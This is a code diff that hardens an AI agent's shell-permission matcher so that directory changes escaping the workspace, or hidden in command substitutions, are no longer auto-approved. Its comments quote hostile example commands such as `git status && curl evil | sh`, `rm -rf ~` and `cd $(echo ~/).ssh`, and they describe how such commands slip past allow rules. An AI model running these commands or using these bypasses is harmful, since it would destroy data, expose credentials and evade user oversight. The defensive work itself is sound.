@@ -988,9 +988,24 @@ function matchOneShell(rules: PermissionRule[], command: string): PermissionRule
  * not `do rm -rf ~` (which a deny on `rm` missed and a junk allow on `do` approved).
  */
 export function splitShellCommand(command: string): string[] {
-  const segments: string[] = []
+  return shellSegments(command).map((s) => s.text)
+}
+
+/** A sub-command {@link splitShellCommand} yields, and where its text came from. */
+interface ShellSegment {
+  text: string
+  /**
+   * A substitution was lifted out of this sub-command, leaving a blank where its output
+   * goes, so the text no longer shows what bash runs: `cd $(echo ~/).ssh` reads `cd .ssh`.
+   */
+  lifted: boolean
+}
+
+/** {@link splitShellCommand}, with each sub-command's {@link ShellSegment.lifted} flag. */
+function shellSegments(command: string): ShellSegment[] {
+  const segments: ShellSegment[] = []
   collectShellSegments(command, segments, 0)
-  return segments.length ? segments : [command.trim()]
+  return segments.length ? segments : [{ text: command.trim(), lifted: false }]
 }
 
 /**
@@ -1013,7 +1028,7 @@ const MAX_SUBST_DEPTH = 32
  * then split the residual on the shell control operators. Nested parens are
  * balanced so substitution boundaries are found correctly.
  */
-function collectShellSegments(command: string, segments: string[], depth: number): void {
+function collectShellSegments(command: string, segments: ShellSegment[], depth: number): void {
   const recurse = (inner: string): void => {
     if (depth < MAX_SUBST_DEPTH) {
       collectShellSegments(inner, segments, depth + 1)
@@ -1021,10 +1036,11 @@ function collectShellSegments(command: string, segments: string[], depth: number
       // Too deep to keep expanding — surface the body opaquely so it still can't
       // match a narrow allow rule (over-segment ⇒ stricter, never looser).
       const t = inner.trim()
-      if (t) segments.push(t)
+      if (t) segments.push({ text: t, lifted: false })
     }
   }
   let outer = ''
+  const blanks: number[] = [] // where in `outer` a lifted substitution left its blank
   for (let i = 0; i < command.length; ) {
     const two = command.slice(i, i + 2)
     if (two === '$(' || two === '<(' || two === '>(') {
@@ -1033,20 +1049,24 @@ function collectShellSegments(command: string, segments: string[], depth: number
         // Unbalanced (a shell syntax error) — treat the rest as a command body too
         // so nothing hides behind the unterminated opener, then stop scanning.
         recurse(command.slice(i + 2))
+        blanks.push(outer.length)
         outer += ' '
         break
       }
       recurse(command.slice(i + 2, close))
+      blanks.push(outer.length)
       outer += ' '
       i = close + 1
     } else if (command[i] === '`') {
       const close = command.indexOf('`', i + 1)
       if (close === -1) {
         recurse(command.slice(i + 1))
+        blanks.push(outer.length)
         outer += ' '
         break
       }
       recurse(command.slice(i + 1, close))
+      blanks.push(outer.length)
       outer += ' '
       i = close + 1
     } else {
@@ -1054,10 +1074,18 @@ function collectShellSegments(command: string, segments: string[], depth: number
       i += 1
     }
   }
-  for (const part of outer.split(SHELL_CONTROL_OPERATOR)) {
-    const p = stripShellScaffolding(part)
-    if (p) segments.push(p)
+  // Split as `outer.split(SHELL_CONTROL_OPERATOR)` would, keeping each part's offsets.
+  const operator = new RegExp(SHELL_CONTROL_OPERATOR.source, 'g')
+  let start = 0
+  const push = (end: number): void => {
+    const text = stripShellScaffolding(outer.slice(start, end))
+    if (text) segments.push({ text, lifted: blanks.some((b) => b >= start && b < end) })
   }
+  for (let m = operator.exec(outer); m !== null; m = operator.exec(outer)) {
+    push(m.index)
+    start = m.index + m[0].length
+  }
+  push(outer.length)
 }
 
 /** Reserved words / grouping that may precede a command without being one. */
@@ -1113,16 +1141,66 @@ function matchClosingParen(s: string, open: number): number {
   return -1
 }
 
-/** Directory-change builtins whose only effect is the cwd — never worth a rule. */
+/** Directory-change builtins: their only effect is the cwd. */
 const CWD_BUILTINS = new Set(['cd', 'pushd', 'popd'])
 
 /**
- * Whether a sub-command is a bare directory change (`cd`/`pushd`/`popd`), judged on the
- * word bash runs: `"cd"k` is the program `cdk`, while `\cd` and `$'cd'` are `cd`.
+ * Whether a sub-command runs a directory-change builtin (`cd`/`pushd`/`popd`), judged on
+ * the word bash runs: `"cd"k` is the program `cdk`, while `\cd` and `$'cd'` are `cd`.
  */
 function isCwdOnly(command: string): boolean {
   const first = tokenizeShellCommand(command)[0]
   return first !== undefined && CWD_BUILTINS.has(first)
+}
+
+/**
+ * A character that makes bash expand, split, or redirect a word (`$`, a backtick, a
+ * glob, a brace, an operator, a `#` comment), or that a word holds only when it was
+ * quoted or escaped (a blank, a backslash, a quote).
+ */
+const SHELL_EXPANDING_CHAR = /[\s$`*?[\]{}()<>|&;!#\\'"]/
+
+/**
+ * Whether a `cd` or `pushd`, given as bash words, names the directory it moves to in
+ * its words alone: exactly one argument after any `--` (and `-L` / `-P` on `cd`), with
+ * nothing bash would expand. Otherwise bash takes the directory from somewhere the
+ * escape check can't see: a bare `cd` goes to `$HOME`; `cd -` and `~-` to `$OLDPWD`;
+ * `~+` is `$PWD` and `~user` another home; `$PWD/..` and a substitution expand; `.[.]`
+ * and `{..,}` expand to `..`; and a `popd`, or a `pushd` with no directory, takes one
+ * off the directory stack. While `CDPATH` is set, bash looks a relative name up there
+ * before the cwd, so only a name led by `/`, `./`, or `../` (or `.`, `..`, `~`) counts.
+ */
+function namesItsDirectory(words: string[]): boolean {
+  const [prog, ...args] = words
+  if (prog !== 'cd' && prog !== 'pushd') return false
+  let i = 0
+  for (; args[i]?.startsWith('-'); i++) {
+    if (args[i] === '--') {
+      i++
+      break
+    }
+    if (prog !== 'cd' || !/^-[LP]+$/.test(args[i])) return false // `-`, `-n`, `-1`, …
+  }
+  if (args.length - i !== 1) return false
+  const dir = args[i]
+  if (!dir || /^[-+]/.test(dir) || SHELL_EXPANDING_CHAR.test(dir)) return false
+  if (dir.startsWith('~') && dir !== '~' && !dir.startsWith('~/')) return false
+  return !process.env.CDPATH || /^(?:\/|~|\.\.?(?:\/|$))/.test(dir)
+}
+
+/**
+ * Whether a sub-command is a directory change {@link matchShellRule} may skip: a `cd` or
+ * `pushd` that {@link namesItsDirectory}, into a directory the escape check finds
+ * inside `roots` (a relative one is read against the workspace root, as that check
+ * reads every relative path). Without `roots`, only the first half is judged. Never one
+ * a substitution was lifted out of (see {@link ShellSegment.lifted}): its output joins
+ * the directory (`cd $(echo ~/).ssh`, `cd src$(echo /../..)`) where no check sees it.
+ */
+function isWorkspaceCwdChange(segment: ShellSegment, roots?: string[]): boolean {
+  if (segment.lifted) return false
+  const command = normalizeShellCommand(segment.text)
+  if (!namesItsDirectory(tokenizeShellCommand(command))) return false
+  return roots === undefined || !shellReferencesExternalPath(command, roots)
 }
 
 /**
@@ -1133,15 +1211,19 @@ function isCwdOnly(command: string): boolean {
  * which prompts for shell). This stops a narrow allow-rule (e.g. `git status*`)
  * from auto-approving `git status && curl evil | sh`.
  *
- * A pure `cd`/`pushd`/`popd` sub-command *into the workspace* carries no privilege of
- * its own — a fresh shell resets the cwd on the next call — so an *unmatched* one does
- * not block auto-approval. That lets a generalized rule like `npm install` cover the
- * whole of `cd /repo && npm install` without also needing a rule for the `cd` (agents
- * prepend one constantly). A `cd` that ESCAPES the workspace is NOT skipped: it stays
- * gated so `cd ~/.ssh && <allowed-cmd>` still prompts rather than slipping past the
- * workspace-escape tripwire on the strength of the allowed command alone. A command
- * that is ONLY directory changes still falls through to the policy; an explicit deny
- * on the `cd` still denies.
+ * A `cd` or `pushd` sub-command that provably lands *in the workspace* changes nothing a
+ * rule guards (what runs after it, in this call or a later one that keeps the cwd,
+ * still runs in the workspace), so an *unmatched* one does not block auto-approval.
+ * That lets a generalized rule like `npm install` cover the whole of
+ * `cd /repo && npm install` without also needing a rule for the `cd` (agents prepend
+ * one constantly). Provably means its words name the directory and that directory is
+ * in the workspace (see {@link isWorkspaceCwdChange}). Any other directory change stays
+ * gated: one that ESCAPES the workspace, so `cd ~/.ssh && <allowed-cmd>` still prompts
+ * rather than slipping past the workspace-escape tripwire on the strength of the
+ * allowed command alone, and one whose directory bash finds elsewhere (a bare `cd`,
+ * `cd -`, `popd`, `cd $PWD/..`, `cd .[.]`), where the tripwire can't see where it
+ * lands. A command that is ONLY skipped directory changes still falls through to the
+ * policy; an explicit deny on the `cd` still denies.
  */
 export function matchShellRule(
   rules: PermissionRule[],
@@ -1151,12 +1233,12 @@ export function matchShellRule(
   let allAllow = true
   let anyAsk = false
   let sawGated = false
-  for (const seg of splitShellCommand(command)) {
-    const norm = normalizeShellCommand(seg)
+  for (const seg of shellSegments(command)) {
+    const norm = normalizeShellCommand(seg.text)
     const action = matchOneShell(rules, norm)
     if (action === 'deny') return 'deny' // a denied sub-command denies the whole call
-    // A bare cd that stays inside the workspace is plumbing, not a gated command.
-    if (action == null && isCwdOnly(norm) && !shellReferencesExternalPath(norm, roots)) continue
+    // A directory change that provably stays in the workspace is plumbing, not a gated command.
+    if (action == null && isWorkspaceCwdChange(seg, roots)) continue
     sawGated = true
     if (action === 'allow') continue
     if (action === 'ask') anyAsk = true
@@ -1274,8 +1356,12 @@ function isCountOnlyPager(tokens: string[]): boolean {
  * - The command is split into its chained sub-commands (the same split the matcher
  *   uses), so `cd /repo && npm install foo` yields a rule for `npm install`, not the
  *   whole line.
- * - Pure directory-change sub-commands (`cd`/`pushd`/`popd`) are dropped — they carry
- *   no privilege and only add noise.
+ * - A directory change the matcher skips (a `cd <dir>` into the workspace, see
+ *   {@link isWorkspaceCwdChange}) is dropped: it needs no rule and only adds noise. Any
+ *   other (a bare `cd`, `cd -`, `popd`, `cd $DIR`, and, given the run's `roots`, a `cd`
+ *   out of them) is kept whole, since the matcher gates it, and saved exact (see
+ *   {@link shellAllowRule}). Without `roots` (cleaning up saved rules), a `cd` that
+ *   names its directory is dropped wherever it points.
  * - A sub-command shaped `<program> <verb> …` where `<verb>` is a bare word (e.g.
  *   `git status`, `npm install`) generalizes to that two-token prefix, so repeated
  *   invocations with different trailing arguments collapse onto one rule.
@@ -1305,15 +1391,17 @@ function isCountOnlyPager(tokens: string[]): boolean {
  * Used only for the ALLOW case; a deny is always stored exactly (a broadened deny is
  * dangerous). Never returns an empty list.
  */
-export function shellRulePatterns(command: string): string[] {
+export function shellRulePatterns(command: string, roots?: string[]): string[] {
   const patterns = new Set<string>()
-  for (const seg of splitShellCommand(command)) {
-    const norm = normalizeShellCommand(seg)
+  for (const seg of shellSegments(command)) {
+    const norm = normalizeShellCommand(seg.text)
     const tokens = tokenizeShellCommand(norm)
     const prog = tokens[0]
-    if (!prog || CWD_BUILTINS.has(prog)) continue
+    if (!prog || isWorkspaceCwdChange(seg, roots)) continue
     const verb = tokens[1]
-    if (isCountOnlyPager(tokens)) {
+    if (CWD_BUILTINS.has(prog)) {
+      patterns.add(norm)
+    } else if (isCountOnlyPager(tokens)) {
       patterns.add(prog)
     } else if (
       !ENV_ASSIGN.test(prog) &&
@@ -1346,11 +1434,12 @@ function holdsShellStar(s: string): boolean {
  * the matcher would read that `*` as a wildcard: approving `rm *` would allow
  * `rm -rf ~`, and approving `find . -name "*.ts"` would allow
  * `find . -name x -delete -name y.ts`. So it is `exact`, covering the approved
- * sub-command only. Every other pattern keeps its prefix meaning (`git status` also
- * covers `git status -s`).
+ * sub-command only. So is a directory change: as a prefix, `cd` would cover every
+ * `cd` and `cd -` would cover `cd - x`. Every other pattern keeps its prefix meaning
+ * (`git status` also covers `git status -s`).
  */
 function shellAllowRule(match: string): PermissionRule {
-  return holdsShellStar(match)
+  return holdsShellStar(match) || isCwdOnly(match)
     ? { action: 'allow', tool: 'run_shell', match, exact: true }
     : { action: 'allow', tool: 'run_shell', match }
 }
@@ -1369,9 +1458,10 @@ function subjectArgKeys(toolName: string): string[] {
  * call's own tool.
  *
  * - An ALLOW on `run_shell` stores generalized per-sub-command prefixes (see
- *   {@link shellRulePatterns}), except that a sub-command kept verbatim and holding `*`
- *   is exact (see {@link shellAllowRule}); a shell deny stays as typed (a broadened
- *   deny is risky).
+ *   {@link shellRulePatterns}, given the run's `roots` so a `cd` out of them is kept),
+ *   except that a sub-command kept verbatim and holding `*`, or changing directory, is
+ *   exact (see {@link shellAllowRule}); a shell deny stays as typed (a broadened deny
+ *   is risky).
  * - Any other ALLOW is `exact` (see {@link PermissionRule.exact}): it covers the one
  *   path, URL, or query the user approved. Saved as a glob instead, a model-chosen
  *   path would widen it: a file named `*` would allow every write, and a directory
@@ -1389,7 +1479,8 @@ function subjectArgKeys(toolName: string): string[] {
 export function persistedRules(
   action: 'allow' | 'deny',
   toolName: string,
-  args: Record<string, unknown>
+  args: Record<string, unknown>,
+  roots?: string[]
 ): PermissionRule[] {
   const exact = action === 'allow' && toolName !== 'run_shell'
   const rule = (match: string): PermissionRule =>
@@ -1397,7 +1488,7 @@ export function persistedRules(
   if (toolName === 'apply_patch') return patchSubjectPaths(permissionSubject(toolName, args)).map(rule)
   const subject = permissionSubject(toolName, args)
   if (subject.trim()) {
-    if (action === 'allow' && toolName === 'run_shell') return shellRulePatterns(subject).map(shellAllowRule)
+    if (action === 'allow' && toolName === 'run_shell') return shellRulePatterns(subject, roots).map(shellAllowRule)
     return [rule(subject)]
   }
   if (action === 'allow' && subjectArgKeys(toolName).some((k) => typeof args[k] === 'string')) return []
